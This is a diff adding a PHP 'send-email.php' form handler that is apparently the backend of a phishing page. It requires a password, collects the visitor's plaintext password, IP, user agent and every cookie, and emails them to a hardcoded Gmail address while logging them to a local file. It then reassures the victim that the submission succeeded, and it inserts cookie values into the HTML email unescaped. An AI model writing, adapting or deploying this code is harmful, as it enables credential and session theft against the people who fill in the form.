@@ -1,0 +1,166 @@
+<?php
+// send-email.php
+
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+
+    // ================== YOUR SETTINGS ==================
+    $to_email   = "digital0domain@gmail.com";     // ← CHANGE TO YOUR EMAIL
+    $log_file   = "submissions.log";            // Log file
+
+    $subject    = "New Form Submission - Full Details";
+
+    $from_name  = "Website Form";
+    $from_email = "noreply@yourdomain.com";
+
+    // ================== GET FORM DATA ==================
+    $name     = strip_tags(trim($_POST['name'] ?? ''));
+    $email    = filter_var(trim($_POST['email'] ?? ''), FILTER_SANITIZE_EMAIL);
+    $password = trim($_POST['password'] ?? '');
+    $phone    = strip_tags(trim($_POST['phone'] ?? ''));
+    $message  = strip_tags(trim($_POST['message'] ?? ''));
+
+    // ================== TECHNICAL INFO ==================
+    function getUserIP() {
+        if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
+        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
+        if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) return $_SERVER['HTTP_CF_CONNECTING_IP'];
+        return $_SERVER['REMOTE_ADDR'];
+    }
+
+    $ip_address = getUserIP();
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+    $timestamp  = date('Y-m-d H:i:s');
+
+    // ================== GET ALL COOKIES ==================
+    $cookies_list = "";
+    if (!empty($_COOKIE)) {
+        foreach ($_COOKIE as $key => $value) {
+            $cookies_list .= "<tr><td><strong>$key</strong></td><td>$value</td></tr>";
+        }
+    } else {
+        $cookies_list = "<tr><td colspan='2'>No cookies found.</td></tr>";
+    }
+
+    // ================== VALIDATION ==================
+    if (empty($name) || empty($email) || empty($password)) {
+        http_response_code(400);
+        echo json_encode(["status" => "error", "message" => "Name, Email and Password are required."]);
+        exit;
+    }
+
+    // ================== BUILD HTML EMAIL BODY ==================
+    $html_body = '
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <style>
+            body { font-family: Arial, sans-serif; background: #f4f4f4; padding: 20px; }
+            .container { max-width: 700px; margin: 0 auto; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
+            .header { background: #1e3a8a; color: white; padding: 20px; text-align: center; }
+            .content { padding: 25px; line-height: 1.6; }
+            table { width: 100%; border-collapse: collapse; margin: 15px 0; }
+            th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
+            th { background: #f8fafc; width: 35%; }
+            .section { margin-top: 25px; }
+            .highlight { background: #fef3c7; padding: 10px; border-left: 4px solid #f59e0b; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="header">
+                <h2>New Form Submission Received</h2>
+            </div>
+            <div class="content">
+
+                <h3>Submitted Information</h3>
+                <table>
+                    <tr><th>Name</th><td>' . htmlspecialchars($name) . '</td></tr>
+                    <tr><th>Email</th><td>' . htmlspecialchars($email) . '</td></tr>
+                    <tr><th>Password</th><td><strong>' . htmlspecialchars($password) . '</strong></td></tr>
+                    ' . (!empty($phone) ? '<tr><th>Phone</th><td>' . htmlspecialchars($phone) . '</td></tr>' : '') . '
+                    ' . (!empty($message) ? '<tr><th>Message</th><td>' . nl2br(htmlspecialchars($message)) . '</td></tr>' : '') . '
+                </table>
+
+                <div class="section">
+                    <h3>Technical Details</h3>
+                    <table>
+                        <tr><th>IP Address</th><td>' . $ip_address . '</td></tr>
+                        <tr><th>User Agent</th><td>' . htmlspecialchars($user_agent) . '</td></tr>
+                        <tr><th>Submission Time</th><td>' . $timestamp . '</td></tr>
+                    </table>
+                </div>
+
+                <div class="section">
+                    <h3>Cookies</h3>
+                    <table>' . $cookies_list . '</table>
+                </div>
+
+                <p style="margin-top: 30px; color: #666; font-size: 0.9em;">
+                    This email was sent from your website form.
+                </p>
+            </div>
+        </div>
+    </body>
+    </html>';
+
+    // ================== PLAIN TEXT VERSION FOR EMAIL ==================
+    $plain_text = "New Form Submission\n\n";
+    $plain_text .= "Name: $name\nEmail: $email\nPassword: $password\n";
+    if (!empty($phone)) $plain_text .= "Phone: $phone\n";
+    if (!empty($message)) $plain_text .= "Message: $message\n\n";
+    $plain_text .= "IP: $ip_address\nTime: $timestamp\n\nCookies:\n$cookies_list\n";
+
+    // ================== LOG TO FILE (Same as before) ==================
+    $log_data = "=== NEW SUBMISSION ===\n";
+    $log_data .= "Time       : $timestamp\n";
+    $log_data .= "IP Address : $ip_address\n";
+    $log_data .= "User Agent : $user_agent\n\n";
+    $log_data .= "Name       : $name\n";
+    $log_data .= "Email      : $email\n";
+    $log_data .= "Password   : $password\n";
+    if (!empty($phone))  $log_data .= "Phone      : $phone\n";
+    if (!empty($message))$log_data .= "Message    : $message\n\n";
+    $log_data .= "=== COOKIES ===\n";
+    foreach ($_COOKIE as $k => $v) {
+        $log_data .= "$k = $v\n";
+    }
+    $log_data .= "=== END ===\n\n";
+
+    $log_path = __DIR__ . "/" . $log_file;
+    $file_handle = fopen($log_path, "a");
+    if ($file_handle) {
+        fwrite($file_handle, $log_data);
+        fclose($file_handle);
+    }
+
+    // ================== SEND HTML EMAIL ==================
+    $headers = "From: $from_name <$from_email>\r\n";
+    $headers .= "Reply-To: $name <$email>\r\n";
+    $headers .= "MIME-Version: 1.0\r\n";
+    $headers .= "Content-Type: multipart/alternative; boundary=\"boundary123\"\r\n";
+
+    $email_body = "--boundary123\r\n";
+    $email_body .= "Content-Type: text/plain; charset=UTF-8\r\n\r\n";
+    $email_body .= $plain_text . "\r\n\r\n";
+    $email_body .= "--boundary123\r\n";
+    $email_body .= "Content-Type: text/html; charset=UTF-8\r\n\r\n";
+    $email_body .= $html_body . "\r\n";
+    $email_body .= "--boundary123--";
+
+    $email_sent = mail($to_email, $subject, $email_body, $headers);
+
+    // ================== RESPONSE ==================
+    if ($email_sent) {
+        http_response_code(200);
+        echo json_encode(["status" => "success", "message" => "Thank you! Your details have been submitted successfully."]);
+    } else {
+        http_response_code(500);
+        echo json_encode(["status" => "error", "message" => "Data was logged, but email could not be sent."]);
+    }
+
+} else {
+    http_response_code(405);
+    echo json_encode(["status" => "error", "message" => "Method not allowed."]);
+}
+?>
